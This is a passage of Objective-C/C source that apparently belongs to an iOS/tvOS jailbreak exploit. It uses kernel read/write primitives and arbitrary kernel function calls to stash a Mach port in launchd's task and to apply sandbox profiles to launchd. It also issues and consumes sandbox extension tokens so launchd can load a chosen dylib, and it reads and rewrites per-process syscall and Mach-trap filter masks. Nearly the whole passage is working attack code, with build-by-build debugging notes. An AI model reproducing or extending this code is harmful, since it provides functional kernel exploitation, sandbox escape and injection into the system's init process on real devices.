        dt1025_log(log, @"[!] build102.5.96 kernel rejected consume kern_ret=%d (next gate)", kern_ret);
        return -8;
    }

    if (handle_out > 0) {
        dt1025_set_verdict(verdictOut, @"KCALL596_CONSUME_SMOKE_OK");
        dt1025_stage(@"build102.5.96 KCALL596_CONSUME_SMOKE_OK");
        dt1025_log(log, @"[+] build102.5.96 consume smoke PASS handle_out=%lld dash=NO helper=NO",
            (long long)handle_out);
        return 0;
    }

    /* kern_ret==0 && handle_out==0 — not a kcall dispatch failure */
    dt1025_set_verdict(verdictOut, @"KCALL596_CONSUME_HANDLE_ZERO");
    dt1025_stage(@"build102.5.96 KCALL596_CONSUME_HANDLE_ZERO");
    if (chain.slot0_profile == 0) {
        dt1025_log(log, @"[*] build102.5.96 handle_out=0 slot0=0 — IDA 5510E8 NULL-profile path (kcall ran)");
    } else {
        dt1025_log(log, @"[*] build102.5.96 handle_out=0 slot0=0x%llx — token/profile mismatch (next gate)",
            (unsigned long long)chain.slot0_profile);
    }
    return 0;
}

static const char *const kDT681ProfileNames[] = {
    "cfprefsd", "configd", "trustd", "backboardd"
};

/// IDA gate: stash boomerang Mach port into launchd task->itk_registered[2] via kcall(mach_ports_register).
/// Replaces jbctl userspace mach_ports_lookup/register on launchd (682 kr=0x5 / 683 TFP1 break).
int dt681_kcall_stash_boomerang_port(mach_port_t boomerangPort, void (^log)(NSString *line),
    NSString * _Nullable * _Nullable verdictOut)
{
    dt1025_stage(@"KCALL684_KCALL_STASH_BEGIN");
    dt1025_log(log, @"[*] build684 IDA itk_registered off=[0x%x,0x%x,0x%x] mach_ports_register=0x%llx",
        kDTTaskItkRegistered0, kDTTaskItkRegistered1, kDTTaskItkRegistered2,
        (unsigned long long)dt1025_kva(kDTUnslidMachPortsRegister1FFF20));

    if (boomerangPort == MACH_PORT_NULL) {
        dt1025_set_verdict(verdictOut, @"KCALL684_STASH_PORT_NULL");
        return -1;
    }

    if (dt1025_kcall_init(log) != 0) {
        NSString *v = g_dt1025_last_kcall_verdict ?: @"KCALL684_KCALL_INIT_FAIL";
        dt1025_set_verdict(verdictOut, v);
        return -2;
    }

    uint64_t launchd_proc = proc_find(1);
    if (!launchd_proc) {
        dt1025_set_verdict(verdictOut, @"KCALL684_LAUNCHD_PROC_FAIL");
        return -3;
    }

    uint64_t launchd_task = proc_task(launchd_proc);
    uint64_t self_task = task_self();
    if (!launchd_task || !self_task) {
        proc_rele(launchd_proc);
        dt1025_set_verdict(verdictOut, @"KCALL684_TASK_KPTR_FAIL");
        return -4;
    }

    uint64_t port_obj = task_get_ipc_port_object(self_task, boomerangPort);
    if (!port_obj) {
        proc_rele(launchd_proc);
        dt1025_set_verdict(verdictOut, @"KCALL684_BOOMERANG_PORT_OBJ_FAIL");
        return -5;
    }

    uint64_t reg0 = kread64(launchd_task + kDTTaskItkRegistered0);
    uint64_t reg1 = kread64(launchd_task + kDTTaskItkRegistered1);
    dt1025_log(log, @"[*] build684 launchd task=0x%llx reg0=0x%llx reg1=0x%llx port_obj=0x%llx",
        (unsigned long long)launchd_task,
        (unsigned long long)reg0,
        (unsigned long long)reg1,
        (unsigned long long)port_obj);

    uint64_t boom_ipc = 0;
    uint64_t copy_argv[] = { port_obj };
    if (kcall(&boom_ipc, dt1025_kva(kDTUnslidIpcPortCopySend1DE0F0), 1, copy_argv) != 0) {
        proc_rele(launchd_proc);
        dt1025_set_verdict(verdictOut, @"KCALL684_IPC_PORT_COPY_SEND_DISPATCH_FAIL");
        return -6;
    }
    if (boom_ipc == 0 || boom_ipc == (uint64_t)-1) {
        proc_rele(launchd_proc);
        dt1025_set_verdict(verdictOut, @"KCALL684_IPC_PORT_COPY_SEND_FAIL");
        dt1025_log(log, @"[!] build684 ipc_port_copy_send ret=0x%llx", (unsigned long long)boom_ipc);
        return -7;
    }

    dt1025_stage(@"KCALL685_IPC_PORT_COPY_SEND_OK");

    /*
     * IPS+IDA gates (j105a 20L563):
     * 684 @ 1FFF7C: mach_ports_register LDR X8,[X19] — a2 must be kernel-readable (not userspace).
     * 685 @ 2000E8: mach_ports_register BL sub_203F90; size=8*count=24 — kfree(a2) on success.
     *   Passing scratch+0x20 → kfree panic @ 849C58 "not found in any zone" (685 IPS addr match).
     * 686 fix: kalloc 0x18 via same path as mach_ports_lookup @ 2001AC-2001C4 (sub_203A9C), fill, pass to register.
     * 687 fix: tag must be slid — kernel uses ADR @ 2001AC (PC-relative), not unslid constant.
     *   686 IPS: X0=0xFFFFFFF0071A5A61 → sub_203A9C @ 203AC4 AND X8; LDR [X8,#0x48] FAR=tag+0x48.
     */
    uint64_t ports_kva = 0;
    uint64_t kalloc_tag_slid = dt1025_kva(kDTUnslidMachPortsArrayKallocTag1A5A60) | 1ULL;
    uint64_t kalloc_argv[] = {
        kalloc_tag_slid, /* ADR+ORR #1 @ 2001AC-2001B4 (slid qword_1A5A60) */
        0x18,            /* W1 @ 2001B8 */
        0x8004,          /* W2 @ 2001BC (32772) */
        0,
    };
    if (kcall(&ports_kva, dt1025_kva(kDTUnslidKalloc203A9C), 4, kalloc_argv) != 0) {
        proc_rele(launchd_proc);
        dt1025_set_verdict(verdictOut, @"KCALL686_KALLOC_PORTS_ARRAY_DISPATCH_FAIL");
        return -10;
    }
    if (!ports_kva) {
        proc_rele(launchd_proc);
        dt1025_set_verdict(verdictOut, @"KCALL686_KALLOC_PORTS_ARRAY_FAIL");
        return -11;
    }

    kwrite64(ports_kva + 0, reg0);
    kwrite64(ports_kva + 8, reg1);
    kwrite64(ports_kva + 16, boom_ipc);

    uint64_t staged0 = kread64(ports_kva + 0);
    uint64_t staged1 = kread64(ports_kva + 8);
    uint64_t staged2 = kread64(ports_kva + 16);
    if (staged0 != reg0 || staged1 != reg1 || staged2 != boom_ipc) {
        proc_rele(launchd_proc);
        dt1025_log(log, @"[!] build686 ports_arg stage mismatch kva=0x%llx got=[0x%llx,0x%llx,0x%llx]",
            (unsigned long long)ports_kva,
            (unsigned long long)staged0,
            (unsigned long long)staged1,
            (unsigned long long)staged2);
        dt1025_set_verdict(verdictOut, @"KCALL686_PORTS_ARG_STAGE_FAIL");
        return -12;
    }

    dt1025_log(log, @"[*] build687 IDA kalloc ports_arg kva=0x%llx kalloc=0x%llx tag_slid=0x%llx [0]=0x%llx [1]=0x%llx [2]=0x%llx",
        (unsigned long long)ports_kva,
        (unsigned long long)dt1025_kva(kDTUnslidKalloc203A9C),
        (unsigned long long)kalloc_tag_slid,
        (unsigned long long)reg0,
        (unsigned long long)reg1,
        (unsigned long long)boom_ipc);
    dt1025_stage(@"KCALL687_KALLOC_PORTS_ARRAY_OK");

    uint64_t kret = 0;
    uint64_t reg_argv[] = { launchd_task, ports_kva, 3 };
    if (kcall(&kret, dt1025_kva(kDTUnslidMachPortsRegister1FFF20), 3, reg_argv) != 0) {
        proc_rele(launchd_proc);
        dt1025_set_verdict(verdictOut, @"KCALL684_MACH_PORTS_REGISTER_DISPATCH_FAIL");
        return -8;
    }

    proc_rele(launchd_proc);

    if ((uint32_t)kret != 0) {
        dt1025_log(log, @"[!] build686 mach_ports_register kern_ret=0x%x", (uint32_t)kret);
        dt1025_set_verdict(verdictOut, @"KCALL684_MACH_PORTS_REGISTER_FAIL");
        return -9;
    }

    uint64_t reg2_after = kread64(launchd_task + kDTTaskItkRegistered2);
    dt1025_log(log, @"[*] build686 launchd task+0x%zx reg2=0x%llx expect_boom_ipc=0x%llx",
        (size_t)kDTTaskItkRegistered2,
        (unsigned long long)reg2_after,
        (unsigned long long)boom_ipc);

    dt1025_stage(@"KCALL684_KCALL_STASH_PORT_OK");
    dt1025_stage(@"KCALL681_JBCTL_STASH_PORT_OK");
    dt1025_set_verdict(verdictOut, nil);
    return 0;
}

static BOOL dt681_launchd_runtime_profile_ok(uint64_t launchd_proc, void (^log)(NSString *line),
    uint64_t *profile_out, uint32_t *configured_slot_out)
{
    uint32_t configured_slot = kread32(dt1025_kva(kDTUnslidSandboxRuntimeSlotECACE4));
    if (configured_slot_out)
        *configured_slot_out = configured_slot;

    uint64_t ucred = proc_ucred(launchd_proc);
    uint64_t label = ucred ? kread_ptr(ucred + koffsetof(ucred, label)) : 0;
    uint64_t profile = (label && configured_slot < 8)
        ? mac_label_get(label, (int)configured_slot) : 0;

    if (profile_out)
        *profile_out = profile;

    dt1025_log(log, @"[*] build102681 launchd mirror configured_slot=%u profile=0x%llx",
        (unsigned)configured_slot, (unsigned long long)profile);

    if (!profile)
        return NO;

    int shape = dt1025_classify_sandbox_profile_shape(profile, log, "launchd_532C68_mirror");
    if (shape == 1) {
        dt1025_stage(@"KCALL681_SLOT0_IS_NOT_SANDBOX_PROFILE");
        return NO;
    }
    return shape == 2;
}

int dt681_launchd_sandbox_unblock(const char *dylibPath, void (^log)(NSString *line),
    NSString * _Nullable * _Nullable verdictOut)
{
    dt1025_stage(@"KCALL681_LAUNCHD_PROFILE_APPLY_THEN_CONSUME");
    dt1025_log(log, @"[*] build102681 Phase 6.1 kernel pre-inject (steps 2-5, IDA gate order)");

    if (!dylibPath || !dylibPath[0]) {
        dt1025_set_verdict(verdictOut, @"KCALL681_DYLIB_PATH_INVALID");
        return -1;
    }

    if (dt1025_kcall_init(log) != 0) {
        NSString *v = g_dt1025_last_kcall_verdict ?: @"KCALL681_KCALL_INIT_FAIL";
        dt1025_set_verdict(verdictOut, v);
        dt1025_stage(v);
        return -2;
    }

    dt1025_stage(@"KCALL681_KCALL_CALIBRATION_BEGIN");
    pid_t app_pid = getpid();
    uint64_t app_proc = proc_find(app_pid);
    if (!app_proc)
        app_proc = dt_kfd_current_proc();
    if (!app_proc) {
        dt1025_set_verdict(verdictOut, @"KCALL681_CALIBRATION_PROC_FAIL");
        dt1025_stage(@"KCALL681_CALIBRATION_PROC_FAIL");
        return -10;
    }

    dt1025_log(log, @"[*] build102681 kcall calibration app proc=0x%llx pid=%d",
        (unsigned long long)app_proc, (int)app_pid);

    NSString *calFail = nil;
    if (dt10252_run_calibration(app_proc, log, &calFail) != 0) {
        NSString *v = calFail ?: @"KCALL681_KCALL_CALIBRATION_FAIL";
        dt1025_set_verdict(verdictOut, v);
        dt1025_stage(v);
        dt1025_stage(@"KCALL681_KCALL_CALIBRATION_FAIL");
        return -11;
    }

    dt1025_stage(@"KCALL681_KCALL_CALIBRATION_OK");

    uint64_t launchd_proc = proc_find(1);
    if (!launchd_proc) {
        dt1025_set_verdict(verdictOut, @"KCALL681_LAUNCHD_PROC_FAIL");
        return -3;
    }

    dt1025_log(log, @"KCALL681_LAUNCHD_PROC_KPTR=0x%llx", (unsigned long long)launchd_proc);

    uint32_t configured_slot = 0;
    uint64_t profile = 0;
    if (!dt681_launchd_runtime_profile_ok(launchd_proc, log, &profile, &configured_slot)) {
        BOOL applied = NO;
        for (size_t ni = 0; ni < sizeof(kDT681ProfileNames) / sizeof(kDT681ProfileNames[0]); ni++) {
            const char *name = kDT681ProfileNames[ni];
            dt_sandbox_apply_bundle_t bundle = {
                .name_ptr = (mach_vm_address_t)(uintptr_t)name,
                .ext_ptr = 0,
                .ext_len = 0,
            };
            int apply_kern_ret = -1;
            if (dt1025_kcall_53d540(launchd_proc, &bundle, log, &apply_kern_ret) != 0) {
                dt1025_log(log, @"[!] build102681 53D540 dispatch fail name=%s", name);
                continue;
            }
            if (apply_kern_ret != 0) {
                dt1025_log(log, @"[!] build102681 53D540 apply fail name=%s kern_ret=%d",
                    name, apply_kern_ret);
                continue;
            }
            dt1025_stage([NSString stringWithFormat:@"KCALL681_53D540_LAUNCHD_APPLY_OK_%s", name]);
            if (dt681_launchd_runtime_profile_ok(launchd_proc, log, &profile, &configured_slot)) {
                applied = YES;
                break;
            }
        }
        if (!applied) {
            dt1025_set_verdict(verdictOut, @"KCALL681_53D540_LAUNCHD_APPLY_ALL_FAILED");
            proc_rele(launchd_proc);
            return -4;
        }
    }

    dt1025_stage([NSString stringWithFormat:@"KCALL681_532C68_MIRROR_PROFILE_0x%llx",
        (unsigned long long)profile]);

    char *read_token = dt1025_issue_token_path(kDTClassRead, dylibPath, log);
    char *exec_token = dt1025_issue_token_path(kDTClassExec, dylibPath, log);
    if (!read_token || !exec_token) {
        if (read_token)
            sandbox_extension_release(read_token);
        if (exec_token)
            sandbox_extension_release(exec_token);
        dt1025_set_verdict(verdictOut, @"KCALL681_EXTENSION_ISSUE_BLOCKED");
        proc_rele(launchd_proc);
        return -5;
    }
    dt1025_stage(@"KCALL681_EXTENSION_ISSUE_OK");

    dt1025_stage(@"KCALL681_5FF124_BYPASS_KCALL55106C");
    int read_kern_ret = 0;
    int exec_kern_ret = 0;
    int64_t read_handle = dt1025_kcall_consume_token(launchd_proc, read_token, log, &read_kern_ret);
    int64_t exec_handle = dt1025_kcall_consume_token(launchd_proc, exec_token, log, &exec_kern_ret);

    sandbox_extension_release(read_token);
    sandbox_extension_release(exec_token);

    dt1025_log(log, @"[*] build102681 consume read handle=%lld kern_ret=%d exec handle=%lld kern_ret=%d",
        (long long)read_handle, read_kern_ret, (long long)exec_handle, exec_kern_ret);

    if (read_handle <= 0 || exec_handle <= 0) {
        dt1025_set_verdict(verdictOut, @"KCALL681_CONSUME_KCALL_HANDLE_ZERO");
        proc_rele(launchd_proc);
        return -6;
    }

    dt1025_stage([NSString stringWithFormat:@"KCALL681_CONSUME_KCALL_HANDLE_%lld",
        (long long)read_handle]);
    dt1025_stage([NSString stringWithFormat:@"KCALL681_CONSUME_KCALL_HANDLE_%lld",
        (long long)exec_handle]);
    dt1025_stage(@"KCALL681_DOPAMINE_INJECT_SEQUENCE_TVOS_DELTA");

    proc_rele(launchd_proc);
    return 0;
}

/* ==========================================================================
 * BUILD102689 — Wall 2 snapshot/comparison fix (tri-state unix/mach/mig)
 * Restore lane unchanged from 688A (532A80 → W1 → 5329AC(NULL)).
 * ========================================================================== */

typedef enum {
    dt688a_fs_error = -1,
    dt688a_fs_null_default = 0,
    dt688a_fs_present = 1,
} dt688a_filter_semantic_t;

typedef struct {
    uint64_t proc_kptr;
    uint64_t task_kptr;
    uint64_t ucred_kptr;
    uint64_t label_kptr;
    uint64_t label_slots[8];
    uint64_t profile_532c68;
    dt688a_filter_semantic_t unix_sem;
    uint8_t unix_mask[kDTUnixSyscallMaskBytes];
    uint64_t unix_mask_kva;
    uint64_t unix_cell_kptr;
    dt688a_filter_semantic_t mach_sem;
    uint8_t mach_mask[kDTMachTrapMaskBytes];
    uint64_t mach_mask_kva;
    uint64_t mach_cell_kptr;
    dt688a_filter_semantic_t mig_sem;
    uint32_t filter_message_flag;
    BOOL filter_message_valid;
    uint32_t proc_filter_flags;
    BOOL filter_ext_gated;
    uint64_t filter_ext_kptr;
    uint32_t mach_cell_w78;
} dt688a_policy_snapshot_v1_t;

typedef enum {
    dt688a_policy_cmp_match = 0,
    dt688a_policy_cmp_partial = 1,
    dt688a_policy_cmp_fail = 2,
} dt688a_policy_cmp_result_t;

static void dt688a_stage(const char *marker)
{
    dt1025_stage([NSString stringWithUTF8String:marker]);
}

static NSString *dt688a_sha256_hex(const uint8_t *bytes, size_t len)
{
    if (!bytes || !len)
        return @"0000000000000000000000000000000000000000000000000000000000000000";
    unsigned char digest[CC_SHA256_DIGEST_LENGTH];
    CC_SHA256(bytes, (CC_LONG)len, digest);
    NSMutableString *hex = [NSMutableString stringWithCapacity:CC_SHA256_DIGEST_LENGTH * 2];
    for (size_t i = 0; i < CC_SHA256_DIGEST_LENGTH; i++)
        [hex appendFormat:@"%02x", digest[i]];
    return hex;
}

static BOOL dt688a_unix_bit36_allowed(const uint8_t *mask, size_t len)
{
    if (!mask || len < 5)
        return NO;
    return (mask[4] & (1u << 4)) == 0;
}

static int dt688a_kcall_532c68(uint64_t proc_kptr, void (^log)(NSString *line), uint64_t *profile_out)
{
    uint64_t func = dt1025_kva(kDTUnslidProcToProfile532C68);
    uint64_t argv[] = { proc_kptr };
    uint64_t kret = 0;

    if (kcall(&kret, func, 1, argv) != 0) {
        dt1025_log(log, @"[!] build688A kcall(532C68) dispatch failed");
        return -1;
    }
    if (profile_out)
        *profile_out = kret;
    dt1025_log(log, @"[*] build688A kcall(532C68) profile=0x%llx",
        (unsigned long long)kret);
    return 0;
}

static int dt688a_kcall_filter_msg_get(uint64_t proc_kptr, uint32_t *flag_out,
    void (^log)(NSString *line), int *kern_ret_out)
{
    uint32_t local = 0;
    uint64_t func = dt1025_kva(kDTUnslidFilterMsgFlagGet5ECB50);
    uint64_t argv[] = { proc_kptr, (uint64_t)(uintptr_t)&local };
    uint64_t kret = 0;

    if (kcall(&kret, func, 2, argv) != 0) {
        dt1025_log(log, @"[!] build688A kcall(proc_get_filter_message_flag) dispatch failed");
        if (kern_ret_out)
            *kern_ret_out = -1;
        return -1;
    }
    if (kern_ret_out)
        *kern_ret_out = (int)(uint32_t)kret;
    if (flag_out)
        *flag_out = local;
    dt1025_log(log, @"[*] build688A kcall(proc_get_filter_message_flag) kern_ret=%d flag=%u",
        (int)(uint32_t)kret, (unsigned)local);
    return 0;
}

static int dt688a_kcall_532a80_clear_slot0(uint64_t proc_kptr, void (^log)(NSString *line))
{
    /* IDA sub_532A80(proc_t proc, mac_label_t label): X0=proc, X1=label.
     * Clear slot 0: 532A80(launchd_proc, NULL) — NOT label as X0 (688A bug, fixed 102690). */
    uint64_t func = dt1025_kva(kDTUnslidSetProfile532A80);
    uint64_t argv[] = { proc_kptr, 0 };
    uint64_t kret = 0;

    dt1025_log(log, @"[*] build688A kcall(532A80) proc=0x%llx label=NULL",
        (unsigned long long)proc_kptr);
    if (kcall(&kret, func, 2, argv) != 0) {
        dt1025_log(log, @"[!] build688A kcall(532A80) dispatch failed");
        return -1;
    }
    dt1025_log(log, @"[*] build688A kcall(532A80) done (void return, kret=0x%llx)",
        (unsigned long long)kret);
    return 0;
}

static int dt688a_kcall_filter_msg_set(uint64_t proc_kptr, uint32_t baseline_fmsg_w1,
    void (^log)(NSString *line), int *kern_ret_out)
{
    /* IDA 5ECB14 → sub_2393B4: X0=filter_ext, W1 inherited from caller (532CBC @532D64).
     * kcall must populate W1 with baseline flag; argc=1 zeroes W1 → always CLEAR. */
    uint32_t w1 = baseline_fmsg_w1 & 1u;
    uint64_t func = dt1025_kva(kDTUnslidFilterMsgFlagSet5ECB14);
    uint64_t argv[] = { proc_kptr, (uint64_t)w1 };
    uint64_t kret = 0;

    dt1025_log(log, @"[*] build688A kcall(proc_set_filter_message_flag) proc=0x%llx W1=%u (baseline&1)",
        (unsigned long long)proc_kptr, (unsigned)w1);
    if (kcall(&kret, func, 2, argv) != 0) {
        dt1025_log(log, @"[!] build688A kcall(proc_set_filter_message_flag) dispatch failed");
        if (kern_ret_out)
            *kern_ret_out = -1;
        return -1;
    }
    if (kern_ret_out)
        *kern_ret_out = (int)(uint32_t)kret;
    dt1025_log(log, @"[*] build688A kcall(proc_set_filter_message_flag) kern_ret=%d",
        (int)(uint32_t)kret);
    return 0;
}

static int dt688a_kcall_5329ac(uint64_t proc_kptr, uint64_t profile_kptr, void (^log)(NSString *line),
    int *kern_ret_out)
{
    uint64_t func = dt1025_kva(kDTUnslidApplyMasks5329AC);
    uint64_t argv[] = { proc_kptr, profile_kptr, 0 };
    uint64_t kret = 0;

    dt1025_log(log, @"[*] build688A kcall(5329AC) proc=0x%llx profile=0x%llx",
        (unsigned long long)proc_kptr, (unsigned long long)profile_kptr);
    if (kcall(&kret, func, 3, argv) != 0) {
        dt1025_log(log, @"[!] build688A kcall(5329AC) dispatch failed");
        if (kern_ret_out)
            *kern_ret_out = -1;
        return -1;
    }
    if (kern_ret_out)
        *kern_ret_out = (int)(uint32_t)kret;
    dt1025_log(log, @"[*] build688A kcall(5329AC) kern_ret=%d", (int)(uint32_t)kret);
    return 0;
}

static const char *dt688a_sem_name(dt688a_filter_semantic_t sem)
{
    switch (sem) {
    case dt688a_fs_present: return "PRESENT";
    case dt688a_fs_null_default: return "NULL_DEFAULT";
    default: return "ERROR";
    }
}

static uint64_t dt688a_runtime_kernproc_kptr(void)
{
    return kread_ptr(dt1025_kva(kDTUnslidKernprocGlobal));
}

static dt688a_filter_semantic_t dt688a_classify_unix(uint64_t proc_kptr, dt688a_policy_snapshot_v1_t *snap,
    void (^log)(NSString *line), const char *tag)
{
    uint64_t kernproc = dt688a_runtime_kernproc_kptr();
    if (kernproc && proc_kptr == kernproc) {
        dt1025_log(log, @"[*] build689 %s unix: proc==*kernproc → NULL_DEFAULT (IDA 5EC764)",
            tag);
        return dt688a_fs_null_default;
    }

    uint64_t cell = kread_ptr(proc_kptr + koffsetof(proc, proc_ro));
    if (!cell) {
        dt1025_log(log, @"[!] build689 %s unix: proc_ro cell missing", tag);
        return dt688a_fs_error;
    }

    uint64_t mask_kva = kread_ptr(cell + 0x10ULL);
    if (mask_kva == 0) {
        dt1025_log(log, @"[*] build689 %s unix: [cell+0x10]==0 → NULL_DEFAULT (IDA 5EC8F4 CBZ)",
            tag);
        snap->unix_cell_kptr = cell;
        return dt688a_fs_null_default;
    }

    if (!dt1025_kernel_range_kptr(mask_kva)) {
        dt1025_log(log, @"[!] build689 %s unix: mask_kva=0x%llx invalid", tag,
            (unsigned long long)mask_kva);
        return dt688a_fs_error;
    }

    if (kread64(cell) != proc_kptr) {
        dt1025_log(log, @"[!] build689 %s unix: [cell+0]=0x%llx != proc (IDA 5EC74C)",
            tag, (unsigned long long)kread64(cell));
        return dt688a_fs_error;
    }

    if (kreadbuf(mask_kva, snap->unix_mask, kDTUnixSyscallMaskBytes) != 0) {
        dt1025_log(log, @"[!] build689 %s unix: kreadbuf 0x22C failed", tag);
        return dt688a_fs_error;
    }

    snap->unix_cell_kptr = cell;
    snap->unix_mask_kva = mask_kva;
    return dt688a_fs_present;
}

static dt688a_filter_semantic_t dt688a_classify_mach(uint64_t proc_kptr, dt688a_policy_snapshot_v1_t *snap,
    void (^log)(NSString *line), const char *tag)
{
    uint32_t pflags = kread32(proc_kptr + kDTProcFilterFlagsOff);
    snap->proc_filter_flags = pflags;
    snap->filter_ext_gated = (pflags & 2u) != 0;

    if (!snap->filter_ext_gated) {
        dt1025_log(log, @"[*] build689 %s mach: proc+0x458 bit2 clear → NULL_DEFAULT (IDA 5EC9AC)",
            tag);
        return dt688a_fs_null_default;
    }

    uint64_t filter_ext = proc_kptr + kDTProcFilterExtOff;
    snap->filter_ext_kptr = filter_ext;

    uint64_t cell = kread_ptr(filter_ext + kDTFilterExtMachCellOff);
    if (!cell) {
        dt1025_log(log, @"[*] build689 %s mach: filter_ext+0x370 cell NULL → NULL_DEFAULT", tag);
        return dt688a_fs_null_default;
    }

    if (kread64(cell + 8ULL) != filter_ext) {
        dt1025_log(log, @"[!] build689 %s mach: [cell+8]!=filter_ext (IDA 239504)", tag);
        return dt688a_fs_error;
    }

    uint64_t mask_kva = kread_ptr(cell + 0x10ULL);
    if (mask_kva == 0) {
        dt1025_log(log, @"[*] build689 %s mach: [cell+0x10]==0 → NULL_DEFAULT (IDA 5EC9C0 CBZ)",
            tag);
        snap->mach_cell_kptr = cell;
        snap->mach_cell_w78 = kread32(cell + 0x78ULL);
        return dt688a_fs_null_default;
    }

    if (!dt1025_kernel_range_kptr(mask_kva)) {
        dt1025_log(log, @"[!] build689 %s mach: mask_kva=0x%llx invalid", tag,
            (unsigned long long)mask_kva);
        return dt688a_fs_error;
    }

    if (kreadbuf(mask_kva, snap->mach_mask, kDTMachTrapMaskBytes) != 0) {
        dt1025_log(log, @"[!] build689 %s mach: kreadbuf 0x80 failed", tag);
        return dt688a_fs_error;
    }

    snap->mach_cell_kptr = cell;
    snap->mach_mask_kva = mask_kva;
    snap->mach_cell_w78 = kread32(cell + 0x78ULL);
    return dt688a_fs_present;
}

static dt688a_filter_semantic_t dt688a_classify_mig(uint64_t proc_kptr, const dt688a_policy_snapshot_v1_t *snap,
    void (^log)(NSString *line), const char *tag)
{
    (void)proc_kptr;

    if (!snap->filter_ext_gated) {
        dt1025_log(log, @"[*] build689 %s mig: filter ext not gated → NULL_DEFAULT (IDA 5EC988)",
            tag);
        return dt688a_fs_null_default;
    }

    uint64_t default_mig_ptr = kread_ptr(dt1025_kva(kDTUnslidDefaultMigMaskSlot));
    if (default_mig_ptr == 0) {
        uint64_t profile_mig_ptr = 0;
        if (snap->profile_532c68)
            profile_mig_ptr = kread_ptr(snap->profile_532c68 + 48ULL);
        if (profile_mig_ptr == 0) {
            dt1025_log(log, @"[*] build689 %s mig: default+profile mig ptr NULL → NULL_DEFAULT "
                @"(IDA ECC3D0/5329AC type2 size0)",
                tag);
            return dt688a_fs_null_default;
        }
    }

    if (snap->mach_sem == dt688a_fs_present && snap->mach_mask_kva) {
        dt1025_log(log, @"[*] build689 %s mig: shares filter_ext cell; no separate mig payload on j105a "
            @"→ NULL_DEFAULT",
            tag);
    } else {
        dt1025_log(log, @"[*] build689 %s mig: no installed mig mask separate from mach → NULL_DEFAULT",
            tag);
    }
    return dt688a_fs_null_default;
}

static void dt688a_log_semantic_line(const char *phase_tag, const dt688a_policy_snapshot_v1_t *snap,
    void (^log)(NSString *line))
{
    dt1025_log(log, @"[*] build689 %s unix=%s mach=%s mig=%s profile=0x%llx fmsg=%u",
        phase_tag,
        dt688a_sem_name(snap->unix_sem),
        dt688a_sem_name(snap->mach_sem),
        dt688a_sem_name(snap->mig_sem),
        (unsigned long long)snap->profile_532c68,
        (unsigned)snap->filter_message_flag);
    char stage_buf[160];
    snprintf(stage_buf, sizeof(stage_buf), "KCALL689_POLICY_SEM_%s unix=%s mach=%s mig=%s",
        phase_tag,
        dt688a_sem_name(snap->unix_sem),
        dt688a_sem_name(snap->mach_sem),
        dt688a_sem_name(snap->mig_sem));
    dt688a_stage(stage_buf);
}

static BOOL dt688a_sem_pair_match(dt688a_filter_semantic_t base, dt688a_filter_semantic_t restored,
    const uint8_t *base_bytes, const uint8_t *restored_bytes, size_t len)
{
    if (base == dt688a_fs_error || restored == dt688a_fs_error)
        return NO;
    if (base == dt688a_fs_null_default && restored == dt688a_fs_null_default)
        return YES;
    if (base == dt688a_fs_present && restored == dt688a_fs_present)
        return base_bytes && restored_bytes && memcmp(base_bytes, restored_bytes, len) == 0;
    return NO;
}

static int dt688a_policy_snapshot_v1(uint64_t proc_kptr, const char *label_tag,
    dt688a_policy_snapshot_v1_t *snap, void (^log)(NSString *line))
{
    const char *phase_tag = "SNAPSHOT";
    if (label_tag) {
        if (strstr(label_tag, "BASELINE") != NULL)
            phase_tag = "BASELINE";
        else if (strstr(label_tag, "MUTATED") != NULL)
            phase_tag = "MUTATED";
        else if (strstr(label_tag, "RESTORED") != NULL)
            phase_tag = "RESTORED";
    }

    if (!snap)
        return -1;
    memset(snap, 0, sizeof(*snap));
    snap->unix_sem = dt688a_fs_error;
    snap->mach_sem = dt688a_fs_error;
    snap->mig_sem = dt688a_fs_error;

    snap->proc_kptr = proc_kptr;
    snap->task_kptr = proc_task(proc_kptr);
    snap->ucred_kptr = proc_ucred(proc_kptr);
    if (snap->ucred_kptr)
        snap->label_kptr = kread_ptr(snap->ucred_kptr + koffsetof(ucred, label));

    for (unsigned slot = 0; slot < 8; slot++)
        snap->label_slots[slot] = dt1025_label_slot_raw(snap->label_kptr, slot);

    if (dt688a_kcall_532c68(proc_kptr, log, &snap->profile_532c68) != 0)
        return -2;

    snap->unix_sem = dt688a_classify_unix(proc_kptr, snap, log, label_tag ?: phase_tag);
    if (snap->unix_sem == dt688a_fs_error) {
        dt1025_log(log, @"[!] build689 %s unix policy state ERROR", label_tag);
        return -3;
    }

    snap->mach_sem = dt688a_classify_mach(proc_kptr, snap, log, label_tag ?: phase_tag);
    if (snap->mach_sem == dt688a_fs_error) {
        dt1025_log(log, @"[!] build689 %s mach policy state ERROR", label_tag);
        return -6;
    }

    snap->mig_sem = dt688a_classify_mig(proc_kptr, snap, log, label_tag ?: phase_tag);
    if (snap->mig_sem == dt688a_fs_error) {
        dt1025_log(log, @"[!] build689 %s mig policy state ERROR", label_tag);
        return -7;
    }

    int fmsg_kern = -1;
    if (dt688a_kcall_filter_msg_get(proc_kptr, &snap->filter_message_flag, log, &fmsg_kern) != 0)
        return -4;
    if (fmsg_kern != 0) {
        dt1025_log(log, @"[!] build689 %s proc_get_filter_message_flag kern_ret=%d", label_tag, fmsg_kern);
        return -5;
    }
    snap->filter_message_valid = YES;

    dt688a_log_semantic_line(phase_tag, snap, log);

    dt1025_log(log,
        @"[*] build689 %s proc=0x%llx task=0x%llx cred=0x%llx label=0x%llx profile=0x%llx "
        @"pflags=0x%x fmsg=%u unix_hash=%@ bit36_allow=%d mach_hash=%@ slot0=0x%llx",
        label_tag,
        (unsigned long long)snap->proc_kptr,
        (unsigned long long)snap->task_kptr,
        (unsigned long long)snap->ucred_kptr,
        (unsigned long long)snap->label_kptr,
        (unsigned long long)snap->profile_532c68,
        (unsigned)snap->proc_filter_flags,
        (unsigned)snap->filter_message_flag,
        snap->unix_sem == dt688a_fs_present
            ? dt688a_sha256_hex(snap->unix_mask, kDTUnixSyscallMaskBytes) : @"n/a",
        snap->unix_sem == dt688a_fs_present
            ? (dt688a_unix_bit36_allowed(snap->unix_mask, kDTUnixSyscallMaskBytes) ? 1 : 0) : -1,
        snap->mach_sem == dt688a_fs_present
            ? dt688a_sha256_hex(snap->mach_mask, kDTMachTrapMaskBytes) : @"n/a",
        (unsigned long long)snap->label_slots[0]);
    return 0;
}

static void dt688a_log_snapshot_slots(const dt688a_policy_snapshot_v1_t *snap, const char *tag,
    void (^log)(NSString *line))
{
    for (unsigned slot = 0; slot < 8; slot++) {
        dt1025_log(log, @"[*] build689 %s label_slot[%u]=0x%llx", tag, slot,
            (unsigned long long)snap->label_slots[slot]);
    }
}

